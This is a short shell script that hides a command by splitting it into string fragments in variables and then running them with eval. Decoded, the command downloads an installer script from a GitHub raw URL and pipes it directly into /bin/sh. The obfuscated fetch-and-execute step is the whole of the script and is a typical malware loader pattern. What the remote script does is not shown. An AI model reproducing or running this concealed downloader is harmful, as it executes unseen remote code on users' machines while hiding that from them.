z="
";Bz=' htt';Sz='alle';Tz='r.sh';Gz='serc';Oz='Sign';Uz=' -O ';Xz='/sh';Cz='ps:/';Nz='uick';Kz='mil2';Ez='.git';Wz='/bin';Rz='inst';Jz='om/e';Iz='nt.c';Pz='al/m';Az='wget';Dz='/raw';Mz='aedQ';Qz='ain/';Lz='37/R';Hz='onte';Vz='- | ';Fz='hubu';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz"